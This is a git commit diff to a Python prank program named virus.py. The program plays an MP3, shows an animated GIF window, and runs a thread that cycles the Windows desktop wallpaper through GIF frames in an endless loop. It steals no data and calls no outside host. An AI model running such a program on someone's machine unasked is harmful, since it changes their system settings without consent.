d89ac08e2ed3cd817d931bd180e4b14ccf5ae3a6
Dekamonia <91356928+Dekamonia@users.noreply.github.com>
2023-05-15 19:04:08 +1000

    sasha

--- virus.py
+++ virus.py
@@ -1,12 +1,11 @@
 import tkinter as tk
 from itertools import count
 import os
-import ctypes
-import time
 import threading
+import ctypes
 
-import vlc
 from PIL import Image, ImageTk
+import pygame
 
 class ImageLabel(tk.Label):
     def load(self, im):
@@ -28,9 +27,11 @@ class ImageLabel(tk.Label):
             self.config(image=self.frames[0])
         else:
             self.next_frame()
+
     def unload(self):
         self.config(image="")
         self.frames = None
+
     def next_frame(self):
         if self.frames:
             self.loc += 1
@@ -52,35 +53,34 @@ class App(tk.Tk):
         self.y = self.screen_height - self.window_height - 10
         self.geometry(f"{self.window_width}x{self.window_height}+{self.x}+{self.y}")
 
-        self.player = vlc.MediaPlayer(os.path.dirname(os.path.realpath("__file__"))+"\media\Nevermind.mp3")
-        self.player.play()
+        pygame.mixer.init()
+        pygame.mixer.music.load(os.path.dirname(os.path.realpath("__file__"))+"\media\\Nevermind.mp3")
+        pygame.mixer.music.play()
 
         self.lbl = ImageLabel(self)
         self.lbl.pack()
-        self.thread_kaun = threading.Thread(target=self.lbl.load, args=(os.path.dirname(os.path.realpath("__file__"))+"\media\gif.gif"),)
+        self.thread_kaun = threading.Thread(target=self.lbl.load, args=(os.path.dirname(os.path.realpath("__file__"))+"\media\gif.gif",))
         self.thread_kaun.start()
 
-        self.thread_bg = threading.Thread(target=self.bg_new)
+        self.thread_bg = threading.Thread(target=self.bg_new, args=(1,))
         self.thread_bg.start()
-        
 
-    def bg_new(self):
-        SPI_SETDESKWALLPAPER = 20
-        gif_path = os.path.dirname(os.path.realpath("__file__"))+"\media\bg.gif"
+    def set_wallpaper(self, image_path):
+        # Set desktop wallpaper on Windows
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+
+    def bg_new(self,i):
+        gif_path = os.path.dirname(os.path.realpath("__file__"))+"\media\\bg.gif" 
         gif_image = Image.open(gif_path)
         frames = gif_image.n_frames
-        frame_delay = 0.001
+        for frame in range(frames):
+            gif_image.seek(frame)
+            frame_image = gif_image.copy()
+            frame_image_path = os.path.dirname(os.path.realpath("__file__"))+f"\media\\frame\\frame_{frame}.png"
+            frame_image.save(frame_image_path)
         while True:
-            for frame in range(frames):
-                gif_image.seek(frame)
-                frame_image = gif_image.copy()
-                frame_image_path = os.path.dirname(os.path.realpath("__file__"))+f"\media\frame\frame_{frame}.png"
-                frame_image.save(frame_image_path)
-                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, frame_image_path, 3)
-                time.sleep(frame_delay)
-                os.remove(frame_image_path)        
-                time.sleep(frame_delay)
-
+            for i in [os.path.dirname(os.path.realpath("__file__"))+f"\media\\frame\\frame_{frame}.png" for frame in range(frames)]:
+                self.set_wallpaper(i)
 
 app = App()
 app.mainloop()
